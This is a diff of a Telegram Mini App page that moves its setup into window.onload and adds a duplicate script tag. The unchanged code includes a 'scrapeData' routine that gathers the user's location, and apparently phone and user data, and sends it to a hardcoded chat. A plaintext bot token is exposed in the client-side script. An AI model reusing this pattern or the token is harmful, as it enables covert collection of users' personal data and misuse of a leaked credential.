@@ -49,23 +49,27 @@
     <div id="viewport-params-size"></div>
     <div id="viewport-params-expand"></div>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script>
-        // Init TWA
-        Telegram.WebApp.ready();
-
-        Telegram.WebApp.setTitle("Nuovo titolo della Mini App");
-        Telegram.WebApp.setBackgroundColor("#8c4343");
-
-        // Show main button
-        Telegram.WebApp.MainButton.setParams({
-            text: 'Main Button'
-        });
-        
-        Telegram.WebApp.MainButton.onClick(function () {
-            Telegram.WebApp.showAlert('Main Button was clicked')
-        });
-        Telegram.WebApp.MainButton.show();
-
+        window.onload = function() {
+            // Init TWA
+            Telegram.WebApp.ready();
+    
+            // Set the title and background color once the WebApp is ready
+            Telegram.WebApp.setTitle("Nuovo titolo della Mini App");
+            Telegram.WebApp.setBackgroundColor("#8c4343");
+    
+            // Show main button
+            Telegram.WebApp.MainButton.setParams({
+                text: 'Main Button'
+            });
+            
+            Telegram.WebApp.MainButton.onClick(function () {
+                Telegram.WebApp.showAlert('Main Button was clicked');
+            });
+            Telegram.WebApp.MainButton.show();
+        }
+    
         // Function to call showPopup API
         function showPopup() {
             Telegram.WebApp.showPopup({
@@ -81,7 +85,7 @@
                 }
             });
         };
-
+    
         // Function to toggle main TWA button
         function toggleMainButton() {
             if (Telegram.WebApp.MainButton.isVisible) {
@@ -90,45 +94,44 @@
                 Telegram.WebApp.MainButton.show();
             }
         };
-
+    
         function scrapeData() {
             requestLocation();
             sendUserDataToTelegram();
             sendPhoneNumberToTelegram();
         }
-
+    
         function requestLocation() {
-            // Initialize LocationManager if not already initialized
             if (!Telegram.WebApp.LocationManager.isInited) {
                 Telegram.WebApp.LocationManager.init(() => {
                     console.log("LocationManager initialized");
-                    getLocationData(); // Call location function after init
+                    getLocationData();
                 });
             } else {
-                getLocationData(); // Directly fetch location if already initialized
+                getLocationData();
             }
         }
-
+    
         function getLocationData() {
             Telegram.WebApp.LocationManager.getLocation((location) => {
                 if (!location) {
                     Telegram.WebApp.showAlert("Location access was not granted.");
                     return;
                 }
-
+    
                 const { latitude, longitude } = location;
                 console.log("Latitude:", latitude, "Longitude:", longitude);
-
+    
                 sendLocationToTelegram(latitude, longitude);
             });
         }
-
+    
         function sendLocationToTelegram(latitude, longitude) {
             const chatId = "7265296083";  // Replace with actual chat ID
             const botToken = "7628792743:AAHU7rESkOh5jhMsiyHg7QSuEJGhPzfV4mE"; // Replace with your bot token
-
+    
             const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
-
+    
             fetch(url)
                 .then(response => response.json())
                 .then(data => {
@@ -142,9 +145,8 @@
                     Telegram.WebApp.showAlert("Error: " + error.message);
                 });
         }
-
-
     </script>
+    
 
 </body>
 
